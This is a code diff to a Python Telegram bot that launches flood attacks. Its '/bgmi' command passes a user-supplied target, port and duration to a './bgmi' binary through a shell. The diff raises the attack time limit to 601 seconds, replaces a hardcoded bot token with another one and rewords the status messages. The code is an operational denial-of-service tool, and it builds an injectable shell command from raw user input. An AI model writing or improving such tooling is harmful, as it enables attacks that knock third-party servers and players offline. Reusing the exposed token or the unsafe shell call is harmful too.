@@ -7,7 +7,7 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7419231303:AAH_77Sg8g3IK7p9lHrvoP7k-xUU3-qcv3g')
+bot = telebot.TeleBot('7290365438:AAF78qWd3bHIJSEuOwbt6dRRWfE4vrC4_pE')
 
 # Admin user IDs
 admin_id = ["7341295676"]
@@ -235,17 +235,17 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 241:
+            if time > 601:
                 response = "❗️Error: use lessthen 241 seconds❗️"
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 240"
+                full_command = f"./bgmi {target} {port} {time} 601"
                 subprocess.run(full_command, shell=True)
                 response = f"🎯 𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 🎯"
         else:
-            response = "E"  # Updated command syntax
+            response = "Attack in Process Please wait for end"  # Updated command syntax
     else:
         response = "🚫𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝗗𝗲𝗻𝗶𝗲𝗱🚫"
 
